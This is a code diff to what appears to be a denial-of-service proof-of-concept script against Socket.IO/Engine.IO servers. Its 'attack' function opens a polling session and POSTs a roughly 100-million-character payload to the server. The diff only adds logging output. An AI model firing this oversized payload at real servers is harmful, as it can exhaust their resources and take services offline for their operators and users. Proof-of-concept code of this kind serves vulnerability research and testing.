@@ -25,17 +25,19 @@ def attack(host, payload_length=100000000):
     base_url = host + "/socket.io/?EIO=3&transport=polling"
     # Create session
     response = requests.get(base_url + timestr()).text
-    print(response)
+    print("Response from server", repr(response))
     sid = re.search("\"sid\":\"([a-f0-9]+)\"", response).group(1)
+    print("Got session", sid)
     session_url = base_url + "&sid=" + sid
     # Fire payload
     payload = make_payload(payload_length)
-    print(payload[:100], len(payload))
-    return requests.post(
+    print("Firing payload of length", len(payload), repr(payload[:100]))
+    final_response = requests.post(
         session_url + timestr(),
         data=payload,
         headers={'Content-Type': 'text/plain'},
     ).text
+    print("Server returned", repr(final_response))
 
 
 def x(payload_length=100000000):
